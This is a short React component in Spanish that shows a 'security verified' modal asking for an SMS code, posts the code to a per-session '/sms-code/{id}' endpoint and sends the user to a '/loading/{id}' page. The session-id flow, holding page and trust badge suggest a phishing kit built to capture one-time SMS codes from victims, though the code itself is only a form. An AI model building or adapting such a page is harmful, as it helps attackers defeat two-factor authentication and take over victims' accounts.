import { ChangeEvent, useState } from 'react'
import toast from 'react-hot-toast'
import { useNavigate, useParams } from 'react-router-dom'
import api from '../api/api'
import { SecurityBadge } from '../components/badges/SecurityBadge'
import { Button } from '../components/ui/buttons/Button'
import { ShadowInput } from '../components/ui/inputs/ShadowInput'

export function SmsModal() {
  const { id } = useParams()
  const navigate = useNavigate()

  const [sms, setSms] = useState('')

  const callback = async (): Promise<void> => {
    if (sms.length <= 0) {
      toast.error(`No ha introducido el código SMS`)
      return
    }

    await api.post(`/sms-code/${id}`, {
      sms_code: sms
    })

    setSms('')
    navigate(`/loading/${id}`, { replace: true })
  }

  return (
    <div className="flex h-full flex-col items-center rounded-2xl border border-black/20 bg-white px-10 py-[50px] font-system">
      <h1 className="mb-2 text-center text-lg font-bold text-black">Introduzca el código SMS</h1>
      <h2 className="mb-[30px] max-w-[280px] text-center text-sm font-semibold text-black/80">
        A pocos pasos de su finalización, confiamos, pero tenemos que asegurarnos de que está bien.
      </h2>
      <ShadowInput
        placeholder="Codigo SMS"
        className="mb-2.5"
        value={sms}
        onChange={(e: ChangeEvent<HTMLInputElement>) => setSms(e.target.value)}
      />
      <Button title="Continuar" className="mb-[14px] h-[42px] w-full max-w-[260px] rounded-[10px]" onClick={callback} />
      <SecurityBadge />
    </div>
  )
}
